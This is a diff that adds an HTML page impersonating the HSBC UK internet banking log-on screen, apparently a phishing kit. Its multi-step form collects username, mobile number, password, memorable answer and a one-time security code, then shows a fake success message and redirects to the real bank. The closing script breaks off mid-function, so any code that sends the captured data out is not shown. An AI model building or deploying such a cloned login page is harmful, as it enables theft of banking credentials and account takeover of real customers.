@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HSBC UK | Log on to Personal Internet Banking</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --red: #DB0011; --dred: #a8000d; --bk: #1a1a1a; --gt: #4a4a4a; --bg: #f5f5f5; --gb: #ccc; }
+    body { font-family: 'Arial', 'Helvetica Neue', sans-serif; background: var(--bg); color: var(--bk); min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: var(--red); padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 68px; }
+    .logo-badge{width:56px;height:56px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;}
+    .logo { display: flex; align-items: center; gap: 14px; text-decoration: none; }
+    .hsbc-hex { display: flex; flex-direction: column; gap: 2px; }
+    .hex-row { display: flex; gap: 2px; }
+    .hex { width: 14px; height: 14px; transform: rotate(30deg); border-radius: 2px; }
+    .hex.r { background: #fff; }
+    .hex.t { background: rgba(255,255,255,.35); }
+    .logo-name { color: #fff; font-size: 26px; font-weight: 900; letter-spacing: 2px; }
+    .logo-sub { color: rgba(255,255,255,.75); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; }
+    .header-right { color: rgba(255,255,255,.85); font-size: 12px; text-align: right; line-height: 1.5; }
+    .header-right a { color: rgba(255,255,255,.85); text-decoration: none; }
+    .header-right a:hover { text-decoration: underline; }
+    .subnav { background: #fff; border-bottom: 3px solid var(--red); padding: 0 32px; display: flex; box-shadow: 0 1px 3px rgba(0,0,0,.1); }
+    .subnav a { font-size: 13px; color: var(--gt); padding: 12px 16px; text-decoration: none; font-weight: 600; border-bottom: 3px solid transparent; margin-bottom: -3px; }
+    .subnav a:hover { color: var(--bk); background: #f9f9f9; }
+    .subnav a.active { color: var(--red); border-bottom-color: var(--red); }
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .wrap { width: 100%; max-width: 980px; display: grid; grid-template-columns: 1fr 300px; gap: 28px; align-items: start; }
+    .card { background: #fff; border: 1px solid #ddd; border-top: 4px solid var(--red); }
+    .card-head { padding: 22px 28px; border-bottom: 1px solid #eee; }
+    .card-head h1 { font-size: 22px; font-weight: 700; color: var(--bk); margin-bottom: 4px; }
+    .card-head p { font-size: 13px; color: var(--gt); }
+    .steps-bar { display: flex; border-bottom: 1px solid #eee; }
+    .sb { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 4px; font-size: 11px; font-weight: 700; color: #bbb; border-bottom: 3px solid transparent; }
+    .sb.active { color: var(--red); border-bottom-color: var(--red); }
+    .sb.done { color: var(--gt); }
+    .sb-num { width: 20px; height: 20px; border-radius: 50%; background: #eee; color: #999; font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; }
+    .sb.active .sb-num { background: var(--red); color: #fff; }
+    .sb.done .sb-num { background: #28a745; color: #fff; }
+    .card-body { padding: 28px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; color: var(--bk); margin-bottom: 6px; }
+    .fg input, .fg select { width: 100%; padding: 10px 13px; border: 1px solid var(--gb); font-size: 15px; color: var(--bk); outline: none; transition: border-color .15s; background: #fff; border-radius: 2px; }
+    .fg input:focus, .fg select:focus { border-color: var(--red); box-shadow: 0 0 0 2px rgba(219,0,17,.12); }
+    .fg select { -webkit-appearance: none; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23666' stroke-width='1.5' fill='none'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 34px; }
+    .hint { font-size: 12px; color: var(--gt); margin-top: 5px; line-height: 1.5; }
+    .btn { width: 100%; padding: 13px; background: var(--red); color: #fff; font-size: 15px; font-weight: 700; border: none; cursor: pointer; transition: background .15s; margin-bottom: 16px; border-radius: 2px; }
+    .btn:hover { background: var(--dred); }
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 10px; }
+    .links a { font-size: 13px; color: var(--red); text-decoration: underline; cursor: pointer; }
+    /* Security device step */
+    .device-box { background: #fff8f8; border: 1px solid #f5c0c4; border-left: 4px solid var(--red); border-radius: 2px; padding: 16px 18px; margin-bottom: 22px; }
+    .device-box-head { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
+    .device-icon { width: 44px; height: 44px; background: var(--red); border-radius: 6px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .device-title { font-size: 14px; font-weight: 700; color: var(--bk); }
+    .device-title small { display: block; font-size: 12px; font-weight: 400; color: var(--gt); margin-top: 2px; }
+    .device-steps { list-style: none; counter-reset: ds; display: flex; flex-direction: column; gap: 8px; }
+    .device-steps li { counter-increment: ds; display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .device-steps li::before { content: counter(ds); width: 20px; height: 20px; border-radius: 50%; background: var(--red); color: #fff; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+    .divider-or { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #888; margin: 16px 0; }
+    .divider-or::before, .divider-or::after { content: ''; flex: 1; border-top: 1px solid #e0e0e0; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 6px; }
+    .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; color: var(--bk); }
+    .otp-boxes input:focus { border-color: var(--red); box-shadow: 0 0 0 2px rgba(219,0,17,.12); }
+    .resend { font-size: 12px; color: var(--gt); margin-bottom: 22px; }
+    .resend a { color: var(--red); text-decoration: underline; }
+    /* Granted */
+    .granted { text-align: center; padding: 20px 0; }
+    .tick { width: 72px; height: 72px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: var(--bk); margin-bottom: 10px; }
+    .granted p { font-size: 14px; color: var(--gt); line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: #fff8f8; border: 1px solid #f5c0c4; border-radius: 2px; padding: 14px; font-size: 13px; color: var(--dred); }
+    .redir strong { display: block; font-size: 15px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 5px; background: #f5c0c4; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: var(--red); }
+    /* Sidebar */
+    .side { display: flex; flex-direction: column; gap: 20px; }
+    .ibox { background: #fff; border: 1px solid #ddd; }
+    .ibox-h { background: var(--red); padding: 12px 16px; color: #fff; font-size: 13px; font-weight: 700; }
+    .ibox-b { padding: 16px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .ibox-b a { color: var(--red); text-decoration: underline; }
+    .ibox-b p { margin-bottom: 8px; }
+    .warn { background: #FFF8E1; border: 1px solid #F0C040; border-left: 4px solid #e6a817; padding: 14px 16px; font-size: 12px; color: #5A4500; line-height: 1.5; }
+    footer { background: #2a2a2a; padding: 20px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; gap: 4px 0; margin-bottom: 12px; }
+    .flinks a { color: #aaa; font-size: 12px; text-decoration: none; padding: 0 12px; border-right: 1px solid #444; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child { border-right: none; }
+    .fcopy { color: #666; font-size: 11px; line-height: 1.6; }
+    @media (max-width: 720px) { .wrap { grid-template-columns: 1fr; } header, .subnav { padding-left: 16px; padding-right: 16px; } }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+
+<header>
+  <a class="logo" href="#"><div class="logo-badge"><img src="data:image/png;base64,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" alt="HSBC" style="width:52px;height:52px;object-fit:contain;"/></div></a>
+  <div class="header-right">
+    <a href="#">Personal Banking</a><br/>
+    <a href="#">Premier &amp; Advance</a> &nbsp;|&nbsp; <a href="#">Business</a>
+  </div>
+</header>
+
+<div class="subnav">
+  <a href="#">Accounts</a>
+  <a href="#">Cards</a>
+  <a href="#">Mortgages</a>
+  <a href="#">Savings</a>
+  <a href="#">Investments</a>
+  <a href="#" class="active">Internet Banking</a>
+</div>
+
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="card-head">
+        <h1>Log on to Personal Internet Banking</h1>
+        <p>Please have your Digital Secure Key ready.</p>
+      </div>
+      <div class="steps-bar">
+        <div class="sb active" id="sb1"><span class="sb-num">1</span> Username</div>
+        <div class="sb" id="sb2"><span class="sb-num">2</span> Password &amp; answer</div>
+        <div class="sb" id="sb3"><span class="sb-num">3</span> Secure Key</div>
+        <div class="sb" id="sb4"><span class="sb-num">4</span> Logged on</div>
+      </div>
+      <div class="card-body">
+
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="uid">Username</label>
+            <input type="text" id="uid" autocomplete="username" />
+            <p class="hint">This is the username you created when you registered. It's not your account number.</p>
+          </div>
+          <div class="fg">
+            <label for="hsbc-mobile">Registered mobile number</label>
+            <input type="tel" id="hsbc-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
+            <p class="hint">Used for SMS one-time passcodes in step 3.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your username?</a>
+            <a href="#">Register for Internet Banking</a>
+          </div>
+        </div>
+
+        <!-- STEP 2: Password + memorable answer -->
+        <div class="step" id="step2">
+          <div class="fg">
+            <label for="pwd">Password</label>
+            <input type="password" id="pwd" autocomplete="current-password" />
+            <p class="hint">Your password is case sensitive.</p>
+          </div>
+          <div class="fg">
+            <label for="mq">Memorable question</label>
+            <select id="mq">
+              <option value="">-- Select your question --</option>
+              <option>What is the name of your first pet?</option>
+              <option>What is your mother's maiden name?</option>
+              <option>What was the name of your first school?</option>
+              <option>What is the name of the town where you were born?</option>
+              <option>What was the make of your first car?</option>
+              <option>What is your oldest sibling's middle name?</option>
+            </select>
+          </div>
+          <div class="fg">
+            <label for="ma">Memorable answer</label>
+            <input type="password" id="ma" autocomplete="off" />
+            <p class="hint">Your answer is not case sensitive.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back</a>
+            <a href="#">Forgotten your password?</a>
+          </div>
+        </div>
+
+        <!-- STEP 3: Digital Secure Key -->
+        <div class="step" id="step3">
+          <div class="device-box">
+            <div class="device-box-head">
+              <div class="device-icon">
+                <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
+                  <rect x="5" y="2" width="16" height="22" rx="2" fill="white" opacity=".9"/>
+                  <rect x="8" y="5" width="10" height="7" rx="1" fill="#DB0011"/>
+                  <circle cx="13" cy="18" r="2.5" fill="#DB0011"/>
+                  <rect x="11" y="13" width="4" height="1" rx=".5" fill="#DB0011"/>
+                </svg>
+              </div>
+              <div class="device-title">
+                HSBC Digital Secure Key
+                <small>Use your physical device or the HSBC UK app</small>
+              </div>
+            </div>
+            <ol class="device-steps">
+              <li>Press the button on your Digital Secure Key (or open the HSBC UK app and tap &lsquo;Secure Key&rsquo;)</li>
+              <li>Enter your 6-digit Secure Key PIN when prompted</li>
+              <li>Enter the 8-digit security number generated below</li>
+            </ol>
+          </div>
+
+          <div class="divider-or">Or enter a one-time passcode sent by SMS</div>
+
+          <div class="fg">
+            <label>Enter your 6-digit security code</label>
+            <div class="otp-boxes">
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hsbc-otp" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend">Problems with your Secure Key? <a href="#" onclick="return false;">Get help</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Resend SMS code</a></p>
+
+          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log on</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(2);return false;">&larr; Back</a>
+          </div>
+        </div>
+
+        <!-- STEP 4: Granted -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick">
+              <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+                <path d="M8 19l8 8 14-14" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <h2>Logon Successful</h2>
+            <p>You have successfully logged on to HSBC Internet Banking.</p>
+            <p>Taking you to your accounts&hellip;</p>
+            <div class="redir">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the HSBC UK website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#DB0011;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2v14M5 6h6a2 2 0 010 4H7a2 2 0 000 4h7" stroke="#DB0011" stroke-width="1.6" stroke-linecap="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#DB0011;background:#FDEEF0;padding:3px 10px;border-radius:20px;">Savings</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#DB0011;line-height:1;margin-bottom:6px;">7.00% AER</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">HSBC Regular Saver</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Save £25–£3,000/month and earn 7.00% AER fixed for 12 months. Exclusively available to HSBC current account holders.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#DB0011;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Open a Regular Saver <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#DB0011" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#DB0011;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="2" y="4" width="14" height="10" rx="2" stroke="#DB0011" stroke-width="1.5"/><path d="M2 8h14" stroke="#DB0011" stroke-width="1.5"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#DB0011;background:#FDEEF0;padding:3px 10px;border-radius:20px;">Premier Banking</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#DB0011;line-height:1;margin-bottom:6px;">Exclusive</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">HSBC Premier Account</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Enjoy worldwide travel insurance, preferential mortgage rates, a dedicated Relationship Manager and exclusive global banking benefits.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#DB0011;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Discover HSBC Premier <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#DB0011" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="warn">
+        <strong>Security reminder:</strong> HSBC will never ask for your full Secure Key code, full password, or ask you to transfer money to a &ldquo;safe account&rdquo;. <a href="#" style="color:#856404">Learn about fraud</a>.
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Digital Secure Key help</div>
+        <div class="ibox-b">
+          <p>Your Digital Secure Key generates a unique code each time you log on.</p>
+          <p><a href="#">Activate your Secure Key</a></p>
+          <p><a href="#">Lost or broken device?</a></p>
+        </div>
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Contact us</div>
+        <div class="ibox-b">
+          <p><strong>03457 404 404</strong><br/>Personal Banking</p>
+          <p>Lines open 8am&ndash;10pm every day</p>
+          <p><a href="#">More contact options</a></p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy notice</a>
+    <a href="#">Cookie policy</a>
+    <a href="#">Accessibility</a>
+    <a href="#">Security</a>
+    <a href="#">Terms &amp; conditions</a>
+    <a href="#">Sitemap</a>
+  </div>
+  <p class="fcopy">HSBC Bank plc. Registered in England and Wales (company number 14259). Registered Office: 8 Canada Square, London E14 5HQ.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+</footer>
+
+<script>
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
